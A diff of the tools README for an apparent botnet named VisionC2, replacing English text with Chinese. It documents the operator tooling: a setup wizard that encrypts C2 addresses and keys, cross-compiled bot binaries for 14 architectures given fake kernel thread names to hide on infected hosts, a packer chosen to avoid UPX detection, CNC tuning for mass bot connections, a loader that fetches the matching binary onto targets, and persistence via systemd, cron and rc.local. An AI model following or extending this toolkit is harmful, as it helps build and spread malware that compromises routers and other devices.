@@ -1,95 +1,73 @@
-# Tools
+# Tools 工具目录
 
-Quick reference for everything in the `tools/` directory.
+此目录包含 VisionC2 的构建、加密、部署和清理辅助工具。
 
----
+## `setup.py`
 
-### setup.py (project root)
+项目根目录中的主安装向导。它负责：
 
-The main build wizard. Handles first-time setup and rebuilds.
+- 生成 C2 地址配置、magic code、协议版本和 AES 密钥
+- 生成 TLS 证书
+- 加密 `bot/config.go` 中的敏感字符串
+- 按模块选项构建 CNC、relay 和 14 架构 Bot
 
-- **Option 1 — Full Setup**: Prompts for C2 address, telnet port, auth secrets, relay endpoints, SOCKS5 credentials, generates TLS certs, rotates the AES key, encrypts all config blobs, and cross-compiles bot + CNC + relay binaries for 14 architectures.
-- **Option 2 — Update C2 Only**: Changes the C2 address and re-obfuscates it without touching other config. Rebuilds bots + relay.
-- **Option 3 — Relay Endpoints Update**: Changes relay endpoint list and SOCKS5 proxy credentials. Rebuilds bots + relay without touching C2/tokens/certs.
+## `crypto.go`
 
-On every run it generates a unique random AES-128-CTR key, patches the XOR byte functions in `bot/opsec.go`, and re-encrypts all sensitive string blobs in `bot/config.go`.
+独立加密/解密工具，使用与 Bot 相同的密钥。
 
----
-
-### crypto.go
-
-Standalone AES-128-CTR encrypt/decrypt tool. Uses the same key as the bot (patched by setup.py).
-
-```
-go run tools/crypto.go encrypt <string>              # Encrypt a plaintext string → hex blob
-go run tools/crypto.go encrypt-slice <a> <b> ...     # Encrypt multiple strings as a null-separated slice
-go run tools/crypto.go decrypt <hex>                 # Decrypt a hex blob → plaintext
-go run tools/crypto.go decrypt-slice <hex>           # Decrypt a hex blob → string slice (one per line)
-go run tools/crypto.go generate                      # Regenerate all encrypted blobs for config.go
-go run tools/crypto.go verify                        # Verify config.go blobs decrypt correctly
-go run tools/crypto.go resetconfig                   # Reset key + blobs back to zero-key source state
+```bash
+go run tools/crypto.go encrypt <string>
+go run tools/crypto.go encrypt-slice <a> <b> ...
+go run tools/crypto.go decrypt <hex>
+go run tools/crypto.go decrypt-slice <hex>
+go run tools/crypto.go generate
+go run tools/crypto.go verify
+go run tools/crypto.go resetconfig
 ```
 
-The `resetconfig` command is useful after a build when you want to restore the source code to its default shipping state (all blobs encrypted under the 0x00 key). This is the reverse of what setup.py does.
+`resetconfig` 可将源码恢复为默认发布状态，便于重新构建。
 
----
+## `build.sh`
 
-### build.sh
+交叉编译 14 种 Linux 架构的 Bot，并输出到项目根目录的 `bins/`。
 
-Cross-compiles the bot for 14 Linux architectures. Each binary gets a fake kernel process name (e.g., `kworkerd0`, `ethd0`, `ip6addrd`) to blend in on infected hosts. Applies `-trimpath -ldflags="-s -w"` to strip debug info, then compresses with m30w packer (zero UPX fingerprint).
+| 二进制名 | 架构 | 说明 |
+|----------|------|------|
+| `ksoftirqd0` | x86 | 32 位 Intel/AMD |
+| `kworker_u8` | x86_64 | 64 位 Intel/AMD |
+| `jbd2_sda1d` | ARMv7 | Raspberry Pi 2/3 |
+| `bioset0` | ARMv5 | 旧 ARM 设备 |
+| `kblockd0` | ARMv6 | Raspberry Pi 1 |
+| `rcuop_0` | ARM64 | 现代 ARM / SBC |
+| `kswapd0` | MIPS | 大端路由器 |
+| `ecryptfsd` | MIPSLE | 小端路由器 |
+| `xfsaild_sda` | MIPS64 | 64 位 MIPS 大端 |
+| `scsi_tmf_0` | MIPS64LE | 64 位 MIPS 小端 |
+| `devfreq_wq` | PPC64 | PowerPC 大端 |
+| `zswap_shrinkd` | PPC64LE | PowerPC 小端 |
+| `edac_polld` | s390x | IBM System/390 |
+| `cfg80211d` | RISC-V 64 | RISC-V 64 位 |
 
-Output goes to `bins/` in the project root.
+## `cleanup.sh`
 
-| Binary Name   | Architecture | Notes                        |
-|---------------|-------------|------------------------------|
-| ksoftirqd0    | x86 (386)   | 32-bit Intel/AMD             |
-| kworker_u8    | x86_64      | 64-bit Intel/AMD             |
-| jbd2_sda1d    | ARMv7       | Raspberry Pi 2/3             |
-| bioset0       | ARMv5       | Older ARM devices            |
-| kblockd0      | ARMv6       | Raspberry Pi 1               |
-| rcuop_0       | ARM64       | RPi 4, Android, modern ARM   |
-| kswapd0       | MIPS        | Routers (big-endian)         |
-| ecryptfsd     | MIPSLE      | Routers (little-endian)      |
-| xfsaild_sda   | MIPS64      | 64-bit MIPS big-endian       |
-| scsi_tmf_0    | MIPS64LE    | 64-bit MIPS little-endian    |
-| devfreq_wq    | PPC64       | PowerPC 64-bit big-endian    |
-| zswap_shrinkd | PPC64LE     | PowerPC 64-bit little-endian |
-| edac_polld    | s390x       | IBM System/390               |
-| cfg80211d     | RISC-V 64   | RISC-V 64-bit                |
+用于清理本机上的 Bot 持久化痕迹。误运行 Bot 时可用 root 执行：
 
----
-
-
----
-
-### cleanup.sh
-
-Emergency removal of all bot persistence artifacts from the local machine. Run as root if the bot was accidentally executed outside debug mode.
-
-Removes:
-- Systemd service 
-- Hidden directory 
-- Cron jobs (persistence script + all 14 bot binary names)
-- rc.local entries
-- Instance lock and speed cache 
-- Running bot processes (all known binary names)
-
-```
+```bash
 sudo bash tools/cleanup.sh
 ```
 
----
+## `fix_botkill.sh`
 
-### fix_botkill.sh
+CNC 服务端调优脚本，用于提升文件描述符限制、开放 443 端口并调整 TCP 缓冲区：
 
-Server-side tuning script. Increases file descriptor limits, opens port 443, and tunes TCP buffer sizes for handling large numbers of bot connections. Run on the CNC server before starting.
-
-```
+```bash
 sudo bash tools/fix_botkill.sh
 ```
 
----
+## `loader.sh`
 
-### upx (m30w packer)
+部署 loader，会自动识别目标架构并下载匹配的 `bins/` 二进制。使用前需要修改脚本中的托管服务器地址。
 
-Bundled m30w packer binary (custom UPX fork). Compresses bot binaries from ~8MB down to ~2.4MB with zero UPX fingerprint.
+## `upx`
+
+随项目附带的打包器二进制，用于压缩 Bot 构建产物。
